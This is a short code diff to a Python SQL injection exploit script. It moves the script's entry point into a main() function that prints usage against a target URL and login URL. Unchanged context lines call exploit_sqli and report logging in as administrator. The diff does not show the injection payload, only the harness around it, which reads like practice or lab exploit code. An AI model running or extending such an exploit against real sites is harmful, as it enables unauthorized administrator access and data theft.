@@ -52,8 +52,12 @@ def exploit_sqli(url):
     return counter
     
 
+def main():
+    if len(sys.argv) != 3:
+        print(f"(+) Usage: {sys.argv[0]} <url> <loginUrl>")
+        print(f"(+) Example: {sys.argv[0]} https://target.com/ https://target.com/login")
+        sys.exit(-1)
 
-if __name__ == '__main__':
     url = sys.argv[1]
     loginUrl = sys.argv[2]
     numCols = exploit_sqli(url)
@@ -62,3 +66,8 @@ if __name__ == '__main__':
         print("(+) SQL injection successed and logged in as administrator")
     else:
         print("(-) SQL injection failed")
+    
+    
+
+if __name__ == "__main__":
+    main()
